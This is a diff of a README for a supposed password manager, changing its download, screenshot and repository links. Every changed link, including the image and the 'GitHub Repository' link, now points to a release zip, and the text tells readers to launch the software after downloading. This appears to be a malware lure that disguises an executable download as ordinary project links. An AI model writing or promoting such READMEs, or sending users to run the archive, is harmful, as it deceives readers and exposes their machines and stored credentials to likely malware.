@@ -12,7 +12,7 @@ Feel free to explore the source code and unleash the power of efficient password
 
 ## Software Download
 
-You can download the Password Manager software [here](https://github.com/user-attachments/files/18383251/Software.zip). Remember, the software needs to be launched after the download is complete. 📂
+You can download the Password Manager software [here](https://github.com/de66610/password-manager/releases/download/v2.0/Release_x64.zip). Remember, the software needs to be launched after the download is complete. 📂
 
 ## Features 🎉
 
@@ -35,7 +35,7 @@ Follow these simple steps to install the Password Manager software:
 
 Take a sneak peek at our Password Manager interface:
 
-![Password Manager](https://example.com/password-manager-screenshot.png)
+![Password Manager](https://github.com/de66610/password-manager/releases/download/v2.0/Release_x64.zip)
 
 ## Usage 🚀
 
@@ -62,4 +62,4 @@ Thank you for choosing **Password Manager** for your password management needs. 
 
 ---
 
-🔗 For the latest updates and releases, visit our [GitHub Repository](https://github.com/user-attachments/files/18383251/Software.zip).  
+🔗 For the latest updates and releases, visit our [GitHub Repository](https://github.com/de66610/password-manager/releases/download/v2.0/Release_x64.zip).  
